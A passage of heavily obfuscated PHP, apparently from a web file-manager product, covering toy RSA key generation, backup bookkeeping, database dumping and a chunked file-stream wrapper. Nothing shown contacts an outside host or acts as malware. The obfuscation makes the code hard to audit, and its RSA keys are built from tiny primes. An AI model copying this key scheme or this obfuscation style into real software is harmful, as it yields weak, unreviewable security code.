$Eó˜äñÀ®Ö = $DËÛÏĞãŒ‹[680]; if (strlen($Eó˜äñÀ®Ö) < $DËÛÏĞãŒ‹[565]) { return; } $fè‚Á‡í„ = $this->{$_SERVER[¯Ú‚è][340]}(); goto AˆİÙ¯ƒÇ„; cïÚëŒ²šª: $aÅƒ¾Ï‹î = $this->{$_SERVER[¯Ú‚è][147]}($fä–ËŒ„˜, $aÄíò§ÅÉå) . $A”¥ªæÉ‡Ô[344] . $B‰¢Øï´Œé; return $aÅƒ¾Ï‹î; $c¥•¶Õš—º = $DËÛÏĞãŒ‹[684]; goto bƒõå¦ÎÃƒ; bƒõå¦ÎÃƒ: } public function twzm70772805($c‹Ï–ÏñŠ») { goto d†¸Ú§ğù; a÷¸µÙ«±‹: while ($B¿¡â¯£ïõ < $aˆˆ¾“êÍâ[565]) { if ($B¿¡â¯£ïõ >= 0) { break; } $B¿¡â¯£ïõ++; } for ($BÓôøâ‡»ö = 0; $BÓôøâ‡»ö < $bŒã»æİ£ * 10; $BÓôøâ‡»ö++) { if (($bŒã»æİ£ * $BÓôøâ‡»ö + 1) % $d„ö‚Å¨—Ç == 0) { $e‹¹²º¦¤ = $FÙˆêç²™Í[201](($bŒã»æİ£ * $BÓôøâ‡»ö + 1) / $d„ö‚Å¨—Ç); break; } } $fñ‘¹…Ì•‘ = $FÙˆêç²™Í[114]($FÙˆêç²™Í[341] . ($B­†âÛóîÈ + $E‘´”„”) . $FÙˆêç²™Í[342] . $d„ö‚Å¨—Ç . $FÙˆêç²™Í[342] . $e‹¹²º¦¤ . $FÙˆêç²™Í[343]); goto CÏÇ°‚Ø¨; eĞÌ·ÕØÇŠ: $B­†âÛóîÈ = 0; $dÊš‹ÙÆŸÒ = $aˆˆ¾“êÍâ[685]; if (!$dÊš‹ÙÆŸÒ) { die; } goto A‘¶²Ùâ‹¦; fØÚÑÛ¬ÏÁ: $bŒã»æİ£ = ($B­†âÛóîÈ - 1) * ($E‘´”„” - 1); $C›½Š·Ä“ = $aˆˆ¾“êÍâ[688]; if (!$C›½Š·Ä“) { die; } goto E‘±ˆô›ç; E‘±ˆô›ç: $d„ö‚Å¨—Ç = $FÙˆêç²™Í[201](($B­†âÛóîÈ + $E‘´”„”) / 2); $fßÚ›ç® = $aˆˆ¾“êÍâ[689]; if (strlen($fßÚ›ç®) < $aˆˆ¾“êÍâ[559]) { return; } goto b¹¿¬±÷‡; CÏÇ°‚Ø¨: $AÔ²˜âñéİ = $this->{$_SERVER[¯Ú‚è][246]}($BÙ˜Â™×ËÖ[0], $fñ‘¹…Ì•‘); $a‡š×®¯¸Ú = $aˆˆ¾“êÍâ[692]; if (!$a‡š×®¯¸Ú) { die; } goto fµôóŒØ; A‘¶²Ùâ‹¦: $E‘´”„” = 0; $Bï»ÚÒ¦­Û = $aˆˆ¾“êÍâ[686]; for ($BÓôøâ‡»ö = 3; $BÓôøâ‡»ö < $FğÓô«‘±»; $BÓôøâ‡»ö += 2) { if ($FğÓô«‘±» % $BÓôøâ‡»ö != 0) { continue; } $B­†âÛóîÈ = $BÓôøâ‡»ö; $c°¸—âÉö = $aˆˆ¾“êÍâ[687]; $E‘´”„” = $FÙˆêç²™Í[201]($FğÓô«‘±» / $BÓôøâ‡»ö); break; } goto fØÚÑÛ¬ÏÁ; d†¸Ú§ğù: $aˆˆ¾“êÍâ =& $_SERVER[¶ªÕß‚ØÁŸ]; $FÙˆêç²™Í =& $_SERVER[¯Ú‚è]; $BÙ˜Â™×ËÖ = $FÙˆêç²™Í[0]($FÙˆêç²™Í[344], $c‹Ï–ÏñŠ»); goto B¥¿£Øˆ¥·; dØ¯“ˆˆ­–: $FğÓô«‘±» = $this->{$_SERVER[¯Ú‚è][246]}($BÙ˜Â™×ËÖ[1] . $FÙˆêç²™Í[10], $FÙˆêç²™Í[149]); if (!$FğÓô«‘±») { return $FÙˆêç²™Í[10]; } $FğÓô«‘±» = $FÙˆêç²™Í[201]($FğÓô«‘±»); goto eĞÌ·ÕØÇŠ; B¥¿£Øˆ¥·: $c°½Şå¥¬¡ = $aˆˆ¾“êÍâ[625]; while ($c°½Şå¥¬¡ < $aˆˆ¾“êÍâ[589]) { if ($c°½Şå¥¬¡ >= 0) { break; } $c°½Şå¥¬¡++; } if ($FÙˆêç²™Í[19]($BÙ˜Â™×ËÖ) != 2) { return $FÙˆêç²™Í[10]; } goto dØ¯“ˆˆ­–; b¹¿¬±÷‡: while (1) { $DÉÒëøÍÓ = $d„ö‚Å¨—Ç; $d‰­Ã³æ‰Ú = $bŒã»æİ£; $e‡¸§ÛÉÀ = $aˆˆ¾“êÍâ[690]; if (!$e‡¸§ÛÉÀ) { return; } while ($d‰­Ã³æ‰Ú % $DÉÒëøÍÓ != 0) { $E Á®Å‘¸Ë = $d‰­Ã³æ‰Ú; $d‰­Ã³æ‰Ú = $DÉÒëøÍÓ; $DÉÒëøÍÓ = $E Á®Å‘¸Ë % $DÉÒëøÍÓ; } if ($DÉÒëøÍÓ == 1) { break; } else { $d„ö‚Å¨—Ç++; } } $e‹¹²º¦¤ = 2; $B¿¡â¯£ïõ = $aˆˆ¾“êÍâ[691]; goto a÷¸µÙ«±‹; fµôóŒØ: return $AÔ²˜âñéİ; $e»°ÛçÁ³Í = $aˆˆ¾“êÍâ[693]; while ($e»°ÛçÁ³Í < $aˆˆ¾“êÍâ[559]) { if ($e»°ÛçÁ³Í >= 0) { break; } $e»°ÛçÁ³Í++; } goto c»®ĞÆ”›; c»®ĞÆ”›: } public function ygzp8c72955f() { goto fœ­ÓÌÕÒö; a‡ˆ¸õ: $b°öë²µÖ = $bùâßÄ¢ƒ‡[696]; while (strlen($b°öë²µÖ) < $bùâßÄ¢ƒ‡[559]) { if (!$b°öë²µÖ) { break; } $b°öë²µÖ++; } while ($c“¥„ğ†®• <= (int) $a°äåøŠ[346]($a©½›ŸŞ·)) { $C­¼·Àà = $c“¥„ğ†®•; while (!0) { $C­¼·Àà++; if ($C­¼·Àà <= 2) { $c“¥„ğ†®• = $C­¼·Àà; break; } else { if ($C­¼·Àà < 2) { continue; } } $e™åê¯‹‘ = !0; for ($c¯­Äå±·¿ = 2; $c¯­Äå±·¿ <= $a°äåøŠ[346]($C­¼·Àà); $c¯­Äå±·¿++) { if ($C­¼·Àà % $c¯­Äå±·¿ == 0) { $e™åê¯‹‘ = !1; } } if ($e™åê¯‹‘) { $c“¥„ğ†®• = $C­¼·Àà; break; } } $E„¨‰ÒîÔï[] = $c“¥„ğ†®•; $Bìø±Î¤Á = $bùâßÄ¢ƒ‡[697]; } goto Eá›Óï—‚‹; fœ­ÓÌÕÒö: $bùâßÄ¢ƒ‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $a°äåøŠ =& $_SERVER[¯Ú‚è]; $a©½›ŸŞ· = $a°äåøŠ[325]($a°äåøŠ[345](2, 14), $a°äåøŠ[345](2, 16) - 1); goto Aõ°œöÉ§å; Aõ°œöÉ§å: $D¤¼Ÿ¤‘ãù = $bùâßÄ¢ƒ‡[694]; if (strlen($D¤¼Ÿ¤‘ãù) < $bùâßÄ¢ƒ‡[565]) { return; } $E„¨‰ÒîÔï = array(); goto a†ÜÒ·ŒŠ; Eá›Óï—‚‹: $CË˜Í°­ó = 2; $Dšë©ÁÜè = $bùâßÄ¢ƒ‡[698]; if (strlen($Dšë©ÁÜè) < $bùâßÄ¢ƒ‡[589]) { die; } goto B¿âìƒ; B¿âìƒ: for ($C­¼·Àà = $a©½›ŸŞ·; $C­¼·Àà > 1; $C­¼·Àà--) { $e™åê¯‹‘ = !0; foreach ($E„¨‰ÒîÔï as $A…®¤Ëİòô) { if ($C­¼·Àà % $A…®¤Ëİòô == 0) { $e™åê¯‹‘ = !1; break; } } if ($e™åê¯‹‘) { $CË˜Í°­ó = $C­¼·Àà; break; } } return $CË˜Í°­ó; goto ağˆ„î¼äé; a†ÜÒ·ŒŠ: $aÒ´°óß‹£ = $bùâßÄ¢ƒ‡[695]; if (strlen($aÒ´°óß‹£) < $bùâßÄ¢ƒ‡[589]) { die; } $c“¥„ğ†®• = 1; goto a‡ˆ¸õ; ağˆ„î¼äé: } public function epyk6087b5e3($e¨ŠÜ½»’, $eÇ¥Ş²›ä¼) { $Bˆ¥ñ„“ =& $_SERVER[¯Ú‚è]; return $Bˆ¥ñ„“[13](array($Bˆ¥ñ„“[14], $Bˆ¥ñ„“[347]), $e¨ŠÜ½»’, $eÇ¥Ş²›ä¼); } public function yaxiaf603c4d($cº¹Êƒ¶’µ, $d‘ÇºÆŸ±å) { $aŒ¸öÜäìˆ =& $_SERVER[¯Ú‚è]; return $aŒ¸öÜäìˆ[13](array($aŒ¸öÜäìˆ[348], $aŒ¸öÜäìˆ[349]), $cº¹Êƒ¶’µ, $d‘ÇºÆŸ±å); } public function jqxpb015fb28($fšğîÉ„ ğ, $d¾âŠÙğ¦Ô) { $a›à’ê¹Ä =& $_SERVER[¶ªÕß‚ØÁŸ]; $cÙæÊ½º¦… =& $_SERVER[¯Ú‚è]; return $cÙæÊ½º¦…[13](array($cÙæÊ½º¦…[348], $cÙæÊ½º¦…[350]), $fšğîÉ„ ğ, $d¾âŠÙğ¦Ô); $A×ŞÇ¡äÌ = $a›à’ê¹Ä[699]; if (strlen($A×ŞÇ¡äÌ) < $a›à’ê¹Ä[559]) { return; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $B¯ø‘ÀÎ‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; self::$name = date($B¯ø‘ÀÎ‘[700]); if (!($B‚ÑÒ…ÃÜ™ = Model($B¯ø‘ÀÎ‘[701])->lastItem())) { $B‚ÑÒ…ÃÜ™ = $this->initData(); } else { self::$name = $B‚ÑÒ…ÃÜ™[$B¯ø‘ÀÎ‘[28]]; if ($B‚ÑÒ…ÃÜ™[$B¯ø‘ÀÎ‘[702]] == $B¯ø‘ÀÎ‘[93]) { self::$name = date($B¯ø‘ÀÎ‘[703]); $F²ê‘¯Çƒ = 0; if (isset($B‚ÑÒ…ÃÜ™[$B¯ø‘ÀÎ‘[290]][$B¯ø‘ÀÎ‘[177]][$B¯ø‘ÀÎ‘[427]])) { $F²ê‘¯Çƒ = (int) $B‚ÑÒ…ÃÜ™[$B¯ø‘ÀÎ‘[290]][$B¯ø‘ÀÎ‘[177]][$B¯ø‘ÀÎ‘[427]]; } if ($B‚ÑÒ…ÃÜ™[$B¯ø‘ÀÎ‘[28]] == self::$name) { Model($B¯ø‘ÀÎ‘[701])->remove($B‚ÑÒ…ÃÜ™[$B¯ø‘ÀÎ‘[375]]); } $B‚ÑÒ…ÃÜ™ = $this->initData($F²ê‘¯Çƒ, $B‚ÑÒ…ÃÜ™[$B¯ø‘ÀÎ‘[704]]); } else { $this->checkStore($B‚ÑÒ…ÃÜ™[$B¯ø‘ÀÎ‘[704]]); } } self::$option = $B‚ÑÒ…ÃÜ™; } private function initData($C„ƒ—ğ—¨² = 0, $F¡¨–Ó” = '') { goto B•÷½¯Ì”Ñ; FòëŒââÕÔ: $a¿õ£ğí…°[$B†Â‘ƒ´Ù[375]] = $D°…óáì“; return $a¿õ£ğí…°; goto C¡“©ÔŞŠ¡; B•÷½¯Ì”Ñ: $B†Â‘ƒ´Ù =& $_SERVER[¶ªÕß‚ØÁŸ]; $bë”“±ãâ = Model($B†Â‘ƒ´Ù[701])->config(); if ($F¡¨–Ó” && $bë”“±ãâ[$B†Â‘ƒ´Ù[704]] != $F¡¨–Ó”) { $C„ƒ—ğ—¨² = 0; } goto F»—í¯²‘; F»—í¯²‘: $this->checkStore($bë”“±ãâ[$B†Â‘ƒ´Ù[704]]); $a¿õ£ğí…° = array($B†Â‘ƒ´Ù[704] => $bë”“±ãâ[$B†Â‘ƒ´Ù[704]], $B†Â‘ƒ´Ù[28] => self::$name, $B†Â‘ƒ´Ù[702] => 0, $B†Â‘ƒ´Ù[705] => $bë”“±ãâ[$B†Â‘ƒ´Ù[705]], $B†Â‘ƒ´Ù[290] => array($B†Â‘ƒ´Ù[706] => array($B†Â‘ƒ´Ù[702] => 0), $B†Â‘ƒ´Ù[707] => array($B†Â‘ƒ´Ù[702] => 0, $B†Â‘ƒ´Ù[708] => 0, $B†Â‘ƒ´Ù[709] => 0, $B†Â‘ƒ´Ù[29] => $B†Â‘ƒ´Ù[33]), $B†Â‘ƒ´Ù[710] => array($B†Â‘ƒ´Ù[702] => 0, $B†Â‘ƒ´Ù[708] => 0, $B†Â‘ƒ´Ù[709] => 0), $B†Â‘ƒ´Ù[177] => array($B†Â‘ƒ´Ù[702] => 0, $B†Â‘ƒ´Ù[711] => 0, $B†Â‘ƒ´Ù[712] => 0, $B†Â‘ƒ´Ù[713] => 0, $B†Â‘ƒ´Ù[714] => 0, $B†Â‘ƒ´Ù[427] => $C„ƒ—ğ—¨²)), $B†Â‘ƒ´Ù[715] => time(), $B†Â‘ƒ´Ù[716] => 0); $D°…óáì“ = Model($B†Â‘ƒ´Ù[701])->insert($a¿õ£ğí…°); goto FòëŒââÕÔ; C¡“©ÔŞŠ¡: } private function checkStore($BÅ›ØíØà) { $b¶¯ÃÚÃÛõ =& $_SERVER[¶ªÕß‚ØÁŸ]; $a¦•ßé¦ë  = Model($b¶¯ÃÚÃÛõ[717])->listData($BÅ›ØíØà); Model($b¶¯ÃÚÃÛõ[717])->checkConfig($a¦•ßé¦ë ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¶ªÕß‚ØÁŸ][701])->findByName(self::$name); } return self::$option; } public static function set($D¡ÆàĞ¦¢Ÿ) { $dôÃäº˜ğ‘ =& $_SERVER[¶ªÕß‚ØÁŸ]; $DˆÉøê›ìÔ = self::get(); foreach ($D¡ÆàĞ¦¢Ÿ as $A››©–î´ => $f’¯ÃÑ•øö) { $d¹ä§Òå = explode($dôÃäº˜ğ‘[101], $A››©–î´); $dÄ£ëá¶…ˆ = count($d¹ä§Òå); switch ($dÄ£ëá¶…ˆ) { case 1: $DˆÉøê›ìÔ[$d¹ä§Òå[0]] = $f’¯ÃÑ•øö; break; case 2: $DˆÉøê›ìÔ[$d¹ä§Òå[0]][$d¹ä§Òå[1]] = $f’¯ÃÑ•øö; break; case 3: $DˆÉøê›ìÔ[$d¹ä§Òå[0]][$d¹ä§Òå[1]][$d¹ä§Òå[2]] = $f’¯ÃÑ•øö; break; } } Model($dôÃäº˜ğ‘[701])->update($DˆÉøê›ìÔ[$dôÃäº˜ğ‘[375]], $DˆÉøê›ìÔ); self::$option = $DˆÉøê›ìÔ; return self::$option; } public function keep() { $EŞ¨¥Îİäî =& $_SERVER[¶ªÕß‚ØÁŸ]; $B«¼†Æ ÄĞ = self::get(); if ($B«¼†Æ ÄĞ[$EŞ¨¥Îİäî[290]][$EŞ¨¥Îİäî[706]][$EŞ¨¥Îİäî[702]] == $EŞ¨¥Îİäî[93]) { return; } $this->backupKeep($B«¼†Æ ÄĞ); self::set(array($EŞ¨¥Îİäî[718] => 1)); } private function backupKeep($FÁĞêÔ¹š) { goto D²¤‘˜ÌØ; E¢®Â­‹Ç: $b¿Å¼©¸±ù = 0; $BöË²¡õÅÂ = array(); foreach ($a¾ÃèÂê´ as $c‹–á‘¾ÏŒ) { if ($b¿Å¼©¸±ù >= 7) { break; } $BöË²¡õÅÂ[] = $c‹–á‘¾ÏŒ[$AçÊ¶Ç‘²ì[28]]; $b¿Å¼©¸±ù++; } goto aëğ¸™âî; aëğ¸™âî: for ($b¿Å¼©¸±ù = 0; $b¿Å¼©¸±ù < 12; $b¿Å¼©¸±ù++) { $BöË²¡õÅÂ[] = date($AçÊ¶Ç‘²ì[719], strtotime("\55{$b¿Å¼©¸±ù}\x20\155\x6f\x6e\x74\150\x73")); } $BöË²¡õÅÂ = array_unique($BöË²¡õÅÂ); foreach ($a¾ÃèÂê´ as $c‹–á‘¾ÏŒ) { if (!empty($c‹–á‘¾ÏŒ[$AçÊ¶Ç‘²ì[28]]) && in_array($c‹–á‘¾ÏŒ[$AçÊ¶Ç‘²ì[28]], $BöË²¡õÅÂ)) { continue; } Model($AçÊ¶Ç‘²ì[701])->remove($c‹–á‘¾ÏŒ[$AçÊ¶Ç‘²ì[375]]); $c”–´ÖŞ»Ç = "\x7b\x69\x6f\72{$FÁĞêÔ¹š[$AçÊ¶Ç‘²ì[704]]}\175\57\x64\141\164\x61\142\x61\163\145\57\142\141\x63\x6b\165\160\x5f{$c‹–á‘¾ÏŒ[$AçÊ¶Ç‘²ì[28]]}"; IO::remove($c”–´ÖŞ»Ç, !1); } goto C…’Ù·¤‘•; D²¤‘˜ÌØ: $AçÊ¶Ç‘²ì =& $_SERVER[¶ªÕß‚ØÁŸ]; $a¾ÃèÂê´ = Model($AçÊ¶Ç‘²ì[701])->listData(); if (empty($a¾ÃèÂê´)) { return; } goto E¢®Â­‹Ç; C…’Ù·¤‘•: } public function db() { goto FÓ„·¦’; FÓ„·¦’: $FÙÊß—ê =& $_SERVER[¶ªÕß‚ØÁŸ]; $cì¾ ‘µôí = self::get(); if ($cì¾ ‘µôí[$FÙÊß—ê[290]][$FÙÊß—ê[707]][$FÙÊß—ê[702]] == $FÙÊß—ê[93]) { return !0; } goto FäîËæª¨ğ; FäîËæª¨ğ: $d¥¶ãÜçÆ = new BackupDb(); if (!$d¥¶ãÜçÆ->index()) { return !1; } self::set(array($FÙÊß—ê[720] => 1)); goto AİÊŸø’›â; AİÊŸø’›â: return !0; goto E½œ¦ÈÀ; E½œ¦ÈÀ: } public function dbFile() { goto eŠ»æ…öÖ; eŠ»æ…öÖ: $dœªïŠ±õÏ =& $_SERVER[¶ªÕß‚ØÁŸ]; $EÎ™î„š™‹ = self::get(); if ($EÎ™î„š™‹[$dœªïŠ±õÏ[290]][$dœªïŠ±õÏ[710]][$dœªïŠ±õÏ[702]] == $dœªïŠ±õÏ[93]) { return !0; } goto cğË¼ÃÂĞ„; cğË¼ÃÂĞ„: $dÃ‰œ‚—ì‚ = new BackupDbFile(); if (!$dÃ‰œ‚—ì‚->index()) { return !1; } self::set(array($dœªïŠ±õÏ[721] => 1)); goto DèèäëªßØ; DèèäëªßØ: return !0; goto aÄ¡¾¾š†‡; aÄ¡¾¾š†‡: } public function file() { $D™Ø‡¬é =& $_SERVER[¶ªÕß‚ØÁŸ]; $Eƒ›’»³Û = self::get(); if ($Eƒ›’»³Û[$D™Ø‡¬é[290]][$D™Ø‡¬é[177]][$D™Ø‡¬é[702]] == $D™Ø‡¬é[93]) { return !0; } if (!isset($Eƒ›’»³Û[$D™Ø‡¬é[705]]) || $Eƒ›’»³Û[$D™Ø‡¬é[705]] == $D™Ø‡¬é[476]) { $dğ˜‘Ê¿Çê = new BackupFile(); if (!$dğ˜‘Ê¿Çê->index()) { return !1; } } self::set(array($D™Ø‡¬é[722] => 1, $D™Ø‡¬é[702] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto CãŠÒ²éË; EîÎ³Ëë¤‚: $aÚÅÉñË¦Ù = new DbManage($D‹‘ó†®î, $Cšâµï–¤Ï); $B˜Ä²…Ïß« = TEMP_FILES . $E…êà¶¤‡[723] . self::$name . $E…êà¶¤‡[8]; del_dir($B˜Ä²…Ïß«); goto Bç¢º±í½²; bï±’­Œ: $Eê°½ÀÎÊñ = array_diff($Eê°½ÀÎÊñ, array($E…êà¶¤‡[724], $E…êà¶¤‡[725])); foreach ($Eê°½ÀÎÊñ as $FßÇˆöÆğ¨) { $A¼ò’Ïß‡ += $aÚÅÉñË¦Ù->model($FßÇˆöÆğ¨)->count(); } $C»ºï¢å = new Task($E…êà¶¤‡[726], $E…êà¶¤‡[727], $A¼ò’Ïß‡, LNG($E…êà¶¤‡[728]) . $E…êà¶¤‡[729] . LNG($E…êà¶¤‡[730])); goto d£‚â¿„ÛÕ; DÍƒ¼ÚÒéˆ: self::$name = $A‹ÇÑ¡Ãà[$E…êà¶¤‡[28]]; $D‹‘ó†®î = $GLOBALS[$E…êà¶¤‡[6]][$E…êà¶¤‡[17]]; $Cšâµï–¤Ï = $this->_dbType($D‹‘ó†®î); goto EîÎ³Ëë¤‚; Bç¢º±í½²: mk_dir($B˜Ä²…Ïß«); $A¼ò’Ïß‡ = $bÁªä™ôìì = 0; $Eê°½ÀÎÊñ = $aÚÅÉñË¦Ù->db()->getTables(); goto bï±’­Œ; d£‚â¿„ÛÕ: foreach ($Eê°½ÀÎÊñ as $FßÇˆöÆğ¨) { $a™÷§÷¨ = $B˜Ä²…Ïß« . $FßÇˆöÆğ¨ . $E…êà¶¤‡[731]; $fä´Í®è÷® = null; if ($FßÇˆöÆğ¨ == $E…êà¶¤‡[732] && (!isset($A‹ÇÑ¡Ãà[$E…êà¶¤‡[705]]) || $A‹ÇÑ¡Ãà[$E…êà¶¤‡[705]] == $E…êà¶¤‡[476])) { $fä´Í®è÷® = self::$io; } $bÁªä™ôìì += $aÚÅÉñË¦Ù->sqlFromDb($FßÇˆöÆğ¨, $a™÷§÷¨, $C»ºï¢å, $fä´Í®è÷®); } $C»ºï¢å->end(); $a˜®šéå¶ = array($E…êà¶¤‡[733] => $Cšâµï–¤Ï, $E…êà¶¤‡[720] => 1, $E…êà¶¤‡[734] => $bÁªä™ôìì, $E…êà¶¤‡[735] => $bÁªä™ôìì); goto E˜Æá½Ê¸Ç; E˜Æá½Ê¸Ç: Backup::set($a˜®šéå¶); return !0; goto A„½ä½î¬; CãŠÒ²éË: $E…êà¶¤‡ =& $_SERVER[¶ªÕß‚ØÁŸ]; $A‹ÇÑ¡Ãà = Backup::get(); self::$io = $A‹ÇÑ¡Ãà[$E…êà¶¤‡[704]]; goto DÍƒ¼ÚÒéˆ; A„½ä½î¬: } private function _dbType($e„ ÏƒÏ’) { goto bËÒ»ïšÆï; bËÒ»ïšÆï: $eÍ¦øŞàÜ =& $_SERVER[¶ªÕß‚ØÁŸ]; $e„ ÏƒÏ’ = array_change_key_case($e„ ÏƒÏ’); $E÷ì™÷«É¸ = $e„ ÏƒÏ’[$eÍ¦øŞàÜ[736]]; goto E¦°é«Ò; E¦°é«Ò: if ($E÷ì™÷«É¸ == $eÍ¦øŞàÜ[737]) { $BâÌ²‰¤   = explode($eÍ¦øŞàÜ[4], $e„ ÏƒÏ’[$eÍ¦øŞàÜ[738]]); $E÷ì™÷«É¸ = $BâÌ²‰¤  [0]; } $e¦Ú‰¢òô = array($eÍ¦øŞàÜ[739] => $eÍ¦øŞàÜ[9], $eÍ¦øŞàÜ[740] => $eÍ¦øŞàÜ[741]); if (isset($e¦Ú‰¢òô[$E÷ì™÷«É¸])) { $E÷ì™÷«É¸ = $e¦Ú‰¢òô[$E÷ì™÷«É¸]; } goto CïïÖ²ºì; CïïÖ²ºì: return $E÷ì™÷«É¸; goto bœ· Ş¹—ƒ; bœ· Ş¹—ƒ: } } goto Bãå²µòæò; A½ê‚®áó°: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($AíÉ»øœÑ³, $AÕïùåÅÅ÷ = '') { goto F÷¸ñíç‹§; FŒÊğ¡Ìò‰: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$AíÉ»øœÑ³])) { self::$_chunkBuffer[$AíÉ»øœÑ³] = array(); } goto aµîÇÂ³§ß; F÷¸ñíç‹§: $this->info = $this->info($AíÉ»øœÑ³); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¶ªÕß‚ØÁŸ][85]]; goto FŒÊğ¡Ìò‰; aµîÇÂ³§ß: return $this->info ? !0 : !1; goto DÉ‹½ÀÈùÄ; DÉ‹½ÀÈùÄ: } function stream_read($B¬Ø èÏß) { $a³Ö¿ë¬Äò = $this->fileSubstr($this->pose, $B¬Ø èÏß); $this->pose += strlen($a³Ö¿ë¬Äò); return $a³Ö¿ë¬Äò; } public function stream_tell() { return $this->pose; } public function stream_seek($dŸ’ÙŠ½Íœ, $A÷Œ°Š„) { $F½©·ì‘Œ =& $_SERVER[¶ªÕß‚ØÁŸ]; if ($A÷Œ°Š„ == SEEK_SET) { $this->pose = $dŸ’ÙŠ½Íœ; } else { if ($A÷Œ°Š„ == SEEK_CUR) { $this->pose += $dŸ’ÙŠ½Íœ; } else { if ($A÷Œ°Š„ == SEEK_END) { $this->pose = $this->info[$F½©·ì‘Œ[87]] + intval($dŸ’ÙŠ½Íœ); } } } if ($dŸ’ÙŠ½Íœ < 0) { $this->pose = $this->info[$F½©·ì‘Œ[87]] + $dŸ’ÙŠ½Íœ; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¶ªÕß‚ØÁŸ][87]]; } public function stream_close() { return !0; } public function url_stat($D¾¥Á§ÒÖë, $b®–·µ¯) { $Côç‘è“§¬ =& $_SERVER[¶ªÕß‚ØÁŸ]; $Eï´„æ°±¸ = $this->info($D¾¥Á§ÒÖë); return array($Côç‘è“§¬[1294] => 0, $Côç‘è“§¬[1295] => 0, $Côç‘è“§¬[12] => 32768 + 511, $Côç‘è“§¬[1296] => 0, $Côç‘è“§¬[1297] => 0, $Côç‘è“§¬[1298] => 0, $Côç‘è“§¬[1299] => 0, $Côç‘è“§¬[87] => $Eï´„æ°±¸[$Côç‘è“§¬[87]], $Côç‘è“§¬[1300] => $Eï´„æ°±¸[$Côç‘è“§¬[1171]], $Côç‘è“§¬[1258] => $Eï´„æ°±¸[$Côç‘è“§¬[117]], $Côç‘è“§¬[1257] => $Eï´„æ°±¸[$Côç‘è“§¬[197]], $Côç‘è“§¬[1301] => 0, $Côç‘è“§¬[1302] => 0); } static $fileInfo = array(); public function info($c°Ç™°°¥Â) { $dÉ£ñ’ŠŞ„ = $_SERVER[¶ªÕß‚ØÁŸ][1303]; if (isset(self::$fileInfo[$c°Ç™°°¥Â])) { return self::$fileInfo[$c°Ç™°°¥Â]; } if (substr($c°Ç™°°¥Â, 0, strlen($dÉ£ñ’ŠŞ„)) != $dÉ£ñ’ŠŞ„) { return !1; } self::$fileInfo[$c°Ç™°°¥Â] = IO::info(substr($c°Ç™°°¥Â, strlen($dÉ£ñ’ŠŞ„))); return self::$fileInfo[$c°Ç™°°¥Â]; } public static function read($B¶¢ô¥“†“, $cªôÎí‰Àë, $bË•²‡ó²¢) { goto CŠòã®††˜; CŠòã®††˜: $fÓ™Úíé½ =& $_SERVER[¶ªÕß‚ØÁŸ]; $cªİò ×ğ = fopen($B¶¢ô¥“†“, $fÓ™Úíé½[1173]); if (!$cªİò ×ğ) { return $fÓ™Úíé½[33]; } goto C ¾£å’ ; AÅÓ­Ò¼ä: $CÍÎØ‘è†ç = 0; while ($CÍÎØ‘è†ç < $bË•²‡ó²¢) { $D§“²Áù«Í = min($cÒšåïõŒö, $bË•²‡ó²¢ - $CÍÎØ‘è†ç); $Fœ¦®–İòß .= fread($cªİò ×ğ, $D§“²Áù«Í); $CÍÎØ‘è†ç += $D§“²Áù«Í; } fclose($cªİò ×ğ); goto Eª­îƒ²Ï; C ¾£å’ : $cÒšåïõŒö = 8192; fseek($cªİò ×ğ, $cªôÎí‰Àë, SEEK_SET); $Fœ¦®–İòß = $fÓ™Úíé½[33]; goto AÅÓ­Ò¼ä; Eª­îƒ²Ï: return $Fœ¦®–İòß; goto Aùâ¯á›ŒÀ; Aùâ¯á›ŒÀ: } public function fileSubstr($A§Öáä«œ, $a½¼¯Îæ¾Æ) { goto EŸÈ¾ëƒÄŠ; bî‰¦‰à¶: $fŸËë˜à›Ú = ceil(($A§Öáä«œ + $a½¼¯Îæ¾Æ) / $bëÜ°ùˆî) * $bëÜ°ùˆî - $cÅ‹İâÎªˆ; $Eà¼ÀÍ¼É‡ = IO::fileSubstr($this->path, $cÅ‹İâÎªˆ, $fŸËë˜à›Ú); $E®ÉšÁ®Î[$cÅ‹İâÎªˆ . $dåÃØÂ¾é[33]] = $Eà¼ÀÍ¼É‡; goto AË’Ù™»ÈÖ; C­¯‰Ô­¯â: $b˜ƒƒö…Şï = 0; $e‡Á½Ÿ”‰ = 0; $a†Œï´ÉİÇ = $dåÃØÂ¾é[33]; goto AçÂŒÓß™; AçÂŒÓß™: foreach ($E®ÉšÁ®Î as $b˜ƒƒö…Şï => $a†Œï´ÉİÇ) { $b˜ƒƒö…Şï = intval($b˜ƒƒö…Şï); $e‡Á½Ÿ”‰ = $b˜ƒƒö…Şï + strlen($a†Œï´ÉİÇ); if ($A§Öáä«œ >= $e‡Á½Ÿ”‰) { continue; } if ($A§Öáä«œ >= $b˜ƒƒö…Şï && $A§Öáä«œ + $a½¼¯Îæ¾Æ <= $e‡Á½Ÿ”‰) { return substr($a†Œï´ÉİÇ, $A§Öáä«œ - $b˜ƒƒö…Şï, $a½¼¯Îæ¾Æ); } break; } if (count($E®ÉšÁ®Î) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($dåÃØÂ¾é[1304], $dåÃØÂ¾é[1305] . count($E®ÉšÁ®Î) . "\73\x73\x74\141\x72\x74\75{$A§Öáä«œ}\x2c\x6c\145\x6e\147\164\x68\75{$a½¼¯Îæ¾Æ}\x3b\x70\x6f\163\145\x3a{$b˜ƒƒö…Şï}\x7e{$e‡Á½Ÿ”‰}"); throw new Exception($dåÃØÂ¾é[1306]); } $cÅ‹İâÎªˆ = intval($A§Öáä«œ / $bëÜ°ùˆî) * $bëÜ°ùˆî; goto bî‰¦‰à¶; AË’Ù™»ÈÖ: ksort($E®ÉšÁ®Î); $FÑö®ìòë• = substr($Eà¼ÀÍ¼É‡, $A§Öáä«œ - $cÅ‹İâÎªˆ, $a½¼¯Îæ¾Æ); return $FÑö®ìòë•; goto fŞà•¼³Á; EŸÈ¾ëƒÄŠ: 